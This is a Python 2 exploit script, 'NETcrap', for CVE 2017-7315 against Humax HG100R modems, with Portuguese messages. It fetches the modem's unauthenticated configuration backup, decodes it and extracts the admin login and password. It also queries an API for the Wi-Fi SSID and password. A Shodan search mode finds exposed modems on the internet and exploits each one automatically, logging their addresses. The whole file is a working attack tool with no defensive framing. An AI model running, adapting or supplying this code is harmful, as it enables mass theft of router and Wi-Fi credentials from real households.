#!/usr/bin/python
# Exploit: CVE 2017-7315
# Date: 12 July 2017
# Exploit Author: Carlos Neri Correia
# Author Contact: hackerama@protonmail.com

import subprocess
import base64
import requests
import sys
import shodan
import threading	

def convert(gateway):
		exploit = '/view/basic/GatewaySettings.bin'
		if gateway.endswith('/'):
				gateway = gateway[:-1]
				
		if not gateway.startswith('http://'):
				url = 'http://'+ gateway+ exploit
				return url
		else:
				url = gateway + exploit
				return url

def encontre(word):
	
    arq = open('wifi.txt', 'r').readlines()
    for item in arq:
        if item.rfind(word) != -1:
            trato = item.strip(' ')
            if trato.startswith('"ssid" : "#'):
                continue
            else:
                return trato
def wifi(gateway):
	comando = 'curl -X POST -s -H \'Content-Type: application/x-www-form-urlencoded charset=UTF-8\' -d \'{\"method\":\"QuickSetupInfo\",\"id\":90,\"jsonrpc":\"2.0\"}\' http://'+gateway+'/api'
	execu = subprocess.Popen([comando], shell=True, stdout=subprocess.PIPE).communicate()[0]
	arq = open('wifi.txt', 'w').write(execu)             				


def shod():
	try:
		results = api.search(ssearch) #'HUMAX org:"NET Virtua"'
		print 'Resultados encontrados: %s' % results['total']
		for result in results['matches']:
   				gateway = (result['ip_str']+':' + str(result['port']))
				print '\n'+'-'*55
				print 'ALVO DETECTADO: ' + gateway
				t = threading.Thread(target=main, args=(gateway,))
				t.setDaemon(True)	
				t.start()
				t.join()
				file = open('ipes.txt', 'a').write(result['ip_str']+':'+str(result['port'])+'\n')
				

	except shodan.APIError, e:
		print 'Error: %s' % e
	except KeyboardInterrupt, e:
		print '\n[NETcrap] - Voce escolheu sair.'

def usage():

	return """
USAGE:  python NETcrap.py [GATEWAY]
		#rede interna
	python NETcrap.py [IP EXTERNO:PORTA]
		#rede externa
	python NETcrap.py -s ['BUSCA']
		#SHODAN search and exploit
	python NETcrap -h
		#this help :v
	
	Ex:
	python NETcrap.py 192.168.0.1     
	python NETcrap.py 192.168.0.1/
	python NETcrap.py 179.123.123.179:9000
	python -s 'HUMAX'
"""

def main(gateway):
	gateway2 = convert(gateway)
	#print gateway2
	url = gateway2
	try:	
		print '\n[NETcrap] - Baixando e decodificando arquivo de backup.'
		req = requests.get(url,timeout=15, stream=True)
		for chunk in req.iter_content(chunk_size=2048):
			if chunk:
				raw = req.content
		output = base64.b64decode(raw).decode('ascii','ignore').replace('^@','')
		open('saida.txt', 'w').write(output)
		
		extract = subprocess.Popen(["strings saida.txt | grep -A 1 admin"], shell=True,stdout=subprocess.PIPE).communicate()[0].split('\n')
		wifi(gateway)	
		print '[NETcrap] - Credenciais de acesso encontradas.\n'
		print 'INFOS DO MODEM:'
		print '---------------'
		print 'Login: %s' % extract[0]
		print 'Senha: %s' % extract[1]
		print 'Modelo: ' + encontre('model_name') [16:-3]
		print 'Provedor: ' + encontre('vendor_name')[17:-2]+'\n'
		print 'INFOS DO WI-FI:'
		print '-------------- '
		print 'SSID: ' + encontre('"ssid"')[10:-3]
		print 'Password: ' + encontre('password')[14:-3]+'\n'

	except:
		print '\n[NETcrap] - Nao foi possivel obter as credenciais de acesso'
		pass

print """
+-----------------------------------------------------+
|           NETcrap - Exploit CVE 2017-7315           |
+-----------------------------------------------------+
                 facebook.com/hacker4ma

Download privilegiado de arquivo de backup e bypass dos 
modems Humax Digital HG100R 2.0.6 (modems padrao da NET) 
obtendo credenciais e outras informacoes sensiveis. 
"""
SHODAN_API_KEY = ""
api = shodan.Shodan(SHODAN_API_KEY)

if len(sys.argv) > 1:
	gateway = convert(sys.argv[1])
	url = str(gateway) #+'/view/basic/GatewaySettings.bin'
	if sys.argv[1] == '-h':
		print usage()
		sys.exit(0)
	if sys.argv[1] == '-s':
		try:
			ssearch = sys.argv[2]
			url = str(gateway)
			shod()
		except KeyboardInterrupt:
			sys.exit(0)
		sys.exit(0)
	else:
			
		main(sys.argv[1])
		print '[NETcrap] - Arquivo de backup salvo como saida.txt. '
		print '[NETcrap] - Outras informacoes interessantes foram salvas no arquivo wifi.txt.\n'
else:
	print usage()



